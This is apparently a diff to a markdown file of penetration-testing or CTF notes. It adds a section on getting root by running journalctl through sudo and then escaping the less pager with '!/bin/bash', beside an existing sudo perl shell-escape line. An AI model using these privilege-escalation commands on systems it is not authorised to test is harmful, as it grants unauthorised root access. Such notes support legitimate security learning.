@@ -295,3 +295,16 @@ smbget -R smb://ip/sambashare
 sudo /usr/bin/perl -e 'exec "/bin/sh"'
 ```
 
+### JournalCTL Less exploitation
+
+```
+/usr/bin/sudo /usr/bin/journalctl -n5 - service.service
+
+```
+creates `less` to create 
+
+Follow up with
+```
+!/bin/bash
+``` 
+to get root
